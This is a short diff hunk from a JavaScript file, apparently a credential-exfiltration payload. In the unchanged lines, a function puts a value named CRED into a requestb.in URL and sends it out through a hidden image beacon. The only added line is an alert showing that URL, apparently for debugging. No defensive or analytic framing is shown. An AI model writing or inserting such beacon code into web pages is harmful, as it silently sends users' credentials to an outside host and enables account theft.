@@ -26,6 +26,7 @@ function foo()
 	 var CRED=string.replace(/@/g,'*');
 	 //var CRED = btoa(string);
 	 var URLL = "http://requestb.in/13jsohk1?"+CRED ;
+		 alert(URLL);
 	 (function(){
     (new Image()).src = URLL;
 })();
